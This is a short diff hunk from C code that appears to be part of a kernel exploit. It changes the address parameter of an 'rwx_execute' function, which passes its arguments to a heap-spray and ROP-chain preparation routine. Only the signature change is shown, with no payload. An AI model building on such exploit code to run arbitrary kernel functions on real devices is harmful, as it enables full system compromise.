@@ -55,7 +55,7 @@ cleanup:
  * Returns:			kern_return_t.
  */
 
-kern_return_t rwx_execute(void * func_addr, unsigned long arg0, unsigned long arg1, unsigned long arg2) { 
+kern_return_t rwx_execute(uint64_t func_addr, unsigned long arg0, unsigned long arg1, unsigned long arg2) {
 	kern_return_t ret = KERN_SUCCESS;
 	heap_spray_prepare_buffer_for_rop(func_addr, 
 		arg0,
